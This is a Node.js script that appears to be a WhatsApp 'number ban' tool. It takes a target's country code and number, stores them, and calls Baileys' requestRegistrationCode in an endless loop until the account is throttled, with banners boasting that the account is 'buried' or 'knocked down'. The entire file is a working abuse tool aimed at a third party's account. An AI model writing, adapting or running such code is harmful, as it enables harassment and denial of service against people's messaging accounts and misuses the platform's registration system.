const prompt = require('prompt-sync')();
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs')


const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbers = JSON.parse(fs.readFileSync('./files/numbers.json'));

const start = async () => {

  const { state, saveCreds } = await useMultiFileAuthState('.oiii')

  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' })
  })
  //console.clear();
  const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    while (true) {
    //console.clear();
      try {
      //console.log(gradient('red', 'red')('💀■■■■■■■💀 +' + ddi + number))
      console.clear();
      console.log(gradient('red', 'blue')('💀CUENTA ENTERRADA A BUG DE REGISTRO BY THYR+' + ddi + number))
        res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 722
        })
        b = (res.reason === 'temporarily_unavailable');
        if (b) {
          //console.log(gradient('gray', 'gray')(`Número derrubado: +${res.login}`));
          setTimeout(async () => {
            dropNumber(context)
          }, res.retry_after * 99999999999999)
          return;
        }
      } catch (error) {
        //console.log(error)
      }
    }

  }
  console.clear();
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
  console.log(gradient('black', 'black')('■'))
  let ddi = prompt(gradient('purple', 'cyan')('[+] enter country code: '));
  let number = prompt(gradient('purple', 'cyan')('[+] enter number only : '))
  let phoneNumber = ddi + number;
  numbers[phoneNumber] = { ddi, number }
  fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, '\t'));
  dropNumber({ phoneNumber, ddi, number })
console.clear();
}
start();
